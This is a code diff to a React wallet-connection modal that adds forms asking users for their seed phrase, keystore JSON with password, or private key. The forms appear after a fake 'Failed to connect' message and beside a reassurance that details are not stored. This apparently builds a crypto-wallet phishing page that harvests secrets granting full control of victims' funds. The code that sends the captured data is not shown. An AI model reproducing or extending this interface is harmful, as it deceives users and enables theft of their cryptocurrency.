@@ -2,6 +2,8 @@
 import { useState } from "react";
 import { X } from "lucide-react";
 import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Textarea } from "@/components/ui/textarea";
 import {
   Dialog,
   DialogContent,
@@ -60,12 +62,80 @@ const WalletConnectionModal = ({ isOpen, onClose, selectedService }: WalletConne
     onClose();
   };
 
+  const renderFormContent = () => {
+    switch (accessType) {
+      case "Phrase":
+        return (
+          <div className="space-y-4">
+            <h3 className="font-medium text-center">Input Secret Key Phrase</h3>
+            <Textarea 
+              placeholder="Enter Phrase" 
+              className="bg-slate-700 border-slate-600 text-white min-h-[100px]"
+            />
+            <p className="text-xs text-gray-400 text-center">
+              Typically 12 (sometimes 24) words separated by single spaces
+            </p>
+          </div>
+        );
+      case "Keystore JSON":
+        return (
+          <div className="space-y-4">
+            <h3 className="font-medium text-center">Input Keystore JSON</h3>
+            <Textarea 
+              placeholder="Enter Keystore JSON" 
+              className="bg-slate-700 border-slate-600 text-white min-h-[100px]" 
+            />
+            <div className="space-y-2">
+              <h3 className="font-medium text-center">Enter Password</h3>
+              <Input 
+                type="password" 
+                placeholder="Enter Password" 
+                className="bg-slate-700 border-slate-600 text-white" 
+              />
+            </div>
+            <p className="text-xs text-gray-400 text-center">
+              Several lines of text beginning with "{"{" }" plus the password you used to encrypt it
+            </p>
+          </div>
+        );
+      case "Private Key":
+        return (
+          <div className="space-y-4">
+            <h3 className="font-medium text-center">Input Private Key phrase</h3>
+            <Input 
+              type="password" 
+              placeholder="Enter Private Key*" 
+              className="bg-slate-700 border-slate-600 text-white" 
+            />
+            <p className="text-xs text-gray-400 text-center">
+              Typically contains a string of alphanumeric characters which are about 50 or more in number.
+            </p>
+          </div>
+        );
+      default:
+        return null;
+    }
+  };
+
+  const renderConnectButton = () => {
+    if (!accessType) return null;
+    
+    return (
+      <Button
+        onClick={handleConnect}
+        className="w-full bg-blue-600 hover:bg-blue-700 text-white"
+      >
+        Connect Wallet
+      </Button>
+    );
+  };
+
   return (
     <Dialog open={isOpen} onOpenChange={onClose}>
       <DialogContent className="bg-slate-800 border-slate-700 text-white max-w-md">
         <DialogHeader>
           <DialogTitle className="text-center text-lg">
-            Connect Your Wallet To Get Started
+            {accessType ? `Connect Your ${walletType || 'Wallet'}` : 'Connect Your Wallet To Get Started'}
           </DialogTitle>
           <button
             onClick={onClose}
@@ -76,59 +146,74 @@ const WalletConnectionModal = ({ isOpen, onClose, selectedService }: WalletConne
         </DialogHeader>
 
         <div className="space-y-6 mt-6">
-          <div className="text-center">
-            <p className="text-red-400 font-medium mb-4">
-              Failed to connect! Use the form below to connect manually.
-            </p>
-          </div>
+          {!accessType && (
+            <div className="text-center">
+              <p className="text-red-400 font-medium mb-4">
+                Failed to connect! Use the form below to connect manually.
+              </p>
+            </div>
+          )}
 
           <div className="space-y-4">
-            <Select value={walletType} onValueChange={setWalletType}>
-              <SelectTrigger className="bg-slate-700 border-slate-600 text-white">
-                <SelectValue placeholder="Wallet Type" />
-              </SelectTrigger>
-              <SelectContent className="bg-slate-700 border-slate-600">
-                {walletTypes.map((wallet) => (
-                  <SelectItem key={wallet} value={wallet} className="text-white hover:bg-slate-600">
-                    {wallet}
-                  </SelectItem>
-                ))}
-              </SelectContent>
-            </Select>
+            {!accessType && (
+              <Select value={walletType} onValueChange={setWalletType}>
+                <SelectTrigger className="bg-slate-700 border-slate-600 text-white">
+                  <SelectValue placeholder="Wallet Type" />
+                </SelectTrigger>
+                <SelectContent className="bg-slate-700 border-slate-600">
+                  {walletTypes.map((wallet) => (
+                    <SelectItem key={wallet} value={wallet} className="text-white hover:bg-slate-600">
+                      {wallet}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+            )}
 
-            <Select value={accessType} onValueChange={setAccessType}>
-              <SelectTrigger className="bg-slate-700 border-slate-600 text-white">
-                <SelectValue placeholder="Access Type" />
-              </SelectTrigger>
-              <SelectContent className="bg-slate-700 border-slate-600">
-                {accessTypes.map((access) => (
-                  <SelectItem key={access} value={access} className="text-white hover:bg-slate-600">
-                    {access}
-                  </SelectItem>
-                ))}
-              </SelectContent>
-            </Select>
+            {walletType && !accessType && (
+              <Select value={accessType} onValueChange={setAccessType}>
+                <SelectTrigger className="bg-slate-700 border-slate-600 text-white">
+                  <SelectValue placeholder="Access Type" />
+                </SelectTrigger>
+                <SelectContent className="bg-slate-700 border-slate-600">
+                  {accessTypes.map((access) => (
+                    <SelectItem key={access} value={access} className="text-white hover:bg-slate-600">
+                      {access}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+            )}
           </div>
 
-          <div className="text-center text-sm text-gray-400 px-4">
-            Any misinformation may hinder the successful resolution of the issue. Your details are not
-            stored on our system; they are for resolution purposes only.
-          </div>
+          {renderFormContent()}
+
+          {!accessType && (
+            <div className="text-center text-sm text-gray-400 px-4">
+              Any misinformation may hinder the successful resolution of the issue. Your details are not
+              stored on our system; they are for resolution purposes only.
+            </div>
+          )}
 
           <div className="flex space-x-3">
-            <Button
-              onClick={handleConnect}
-              className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
-            >
-              Connect Wallet
-            </Button>
-            <Button
-              onClick={onClose}
-              variant="destructive"
-              className="flex-1"
-            >
-              Cancel
-            </Button>
+            {renderConnectButton()}
+            {accessType ? null : (
+              <>
+                <Button
+                  onClick={handleConnect}
+                  className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
+                >
+                  Connect Wallet
+                </Button>
+                <Button
+                  onClick={onClose}
+                  variant="destructive"
+                  className="flex-1"
+                >
+                  Cancel
+                </Button>
+              </>
+            )}
           </div>
         </div>
       </DialogContent>
